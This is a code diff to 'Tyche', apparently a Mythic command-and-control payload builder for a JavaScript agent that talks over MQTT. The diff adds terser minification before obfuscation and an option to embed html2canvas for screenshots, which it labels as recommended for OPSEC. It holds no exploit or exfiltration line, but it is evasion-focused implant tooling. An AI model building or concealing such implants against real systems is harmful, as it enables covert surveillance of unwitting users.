@@ -110,6 +110,18 @@ class Tyche(PayloadType):
             description="Embed mqtt.js library (self-contained, ~360KB larger) vs load from CDN",
             default_value=True
         ),
+        BuildParameter(
+            name="embed_html2canvas",
+            parameter_type=BuildParameterType.Boolean,
+            description="Embed html2canvas library for screenshots (~50KB larger) vs load from CDN. Recommended for OPSEC.",
+            default_value=False
+        ),
+        BuildParameter(
+            name="minify",
+            parameter_type=BuildParameterType.Boolean,
+            description="Minify code with terser before obfuscation (reduces payload size)",
+            default_value=False
+        ),
     ]
     c2_profiles = ["mqtt"]
 
@@ -131,6 +143,36 @@ class Tyche(PayloadType):
         if os.path.exists(filepath):
             return filepath
         return ""
+
+    def run_minifier(self, code):
+        """Run terser to minify the code."""
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f_in:
+            f_in.write(code)
+            input_path = f_in.name
+
+        output_path = input_path + ".min.js"
+
+        try:
+            result = subprocess.run(
+                ["terser", input_path, "-o", output_path, "--compress", "--mangle"],
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+
+            if result.returncode != 0:
+                # Minification is best-effort; return original on failure
+                return code
+
+            with open(output_path, "r") as f_out:
+                return f_out.read()
+
+        finally:
+            for path in [input_path, output_path]:
+                try:
+                    os.unlink(path)
+                except OSError:
+                    pass
 
     def run_obfuscator(self, code, preset_name):
         """Run javascript-obfuscator on the code with the given preset config."""
@@ -248,25 +290,30 @@ class Tyche(PayloadType):
                 StepSuccess=True
             ))
 
-            # ---- Step 3: Obfuscation ----
+            # ---- Step 3: Minification + Obfuscation ----
+            minify = self.get_parameter("minify")
             obf_level = self.get_parameter("obfuscation")
+            obf_msg_parts = []
+
+            if minify:
+                pre_size = len(base_code)
+                base_code = self.run_minifier(base_code)
+                post_size = len(base_code)
+                obf_msg_parts.append("Minified ({} -> {} bytes)".format(pre_size, post_size))
 
             if obf_level != "none":
                 base_code = self.run_obfuscator(base_code, obf_level)
+                obf_msg_parts.append("Obfuscated with '{}' preset".format(obf_level))
 
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="Obfuscating Script",
-                    StepStdout="Obfuscated with '{}' preset.".format(obf_level),
-                    StepSuccess=True
-                ))
-            else:
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="Obfuscating Script",
-                    StepStdout="No obfuscation requested, skipping.",
-                    StepSuccess=True
-                ))
+            if not obf_msg_parts:
+                obf_msg_parts.append("No minification or obfuscation requested")
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Obfuscating Script",
+                StepStdout=". ".join(obf_msg_parts) + ".",
+                StepSuccess=True
+            ))
 
             # ---- Step 4: Embed or reference mqtt.js ----
             embed_mqtt = self.get_parameter("embed_mqtt")
@@ -282,6 +329,17 @@ class Tyche(PayloadType):
                     mqtt_msg = "CDN (mqtt.min.js not found)"
             else:
                 mqtt_msg = "CDN"
+
+            # ---- Step 5: Embed html2canvas if requested ----
+            embed_html2canvas = self.get_parameter("embed_html2canvas")
+            if embed_html2canvas:
+                h2c_path = os.path.join(self.agent_code_path, "base_agent", "html2canvas.min.js")
+                if os.path.exists(h2c_path):
+                    h2c_code = open(h2c_path, "r").read()
+                    base_code = h2c_code + "\n" + base_code
+                    mqtt_msg += ", html2canvas: embedded"
+                else:
+                    mqtt_msg += ", html2canvas: CDN (html2canvas.min.js not found in agent_code/base_agent/)"
 
             # ---- Output ----
             if self.get_parameter("output") == "base64":
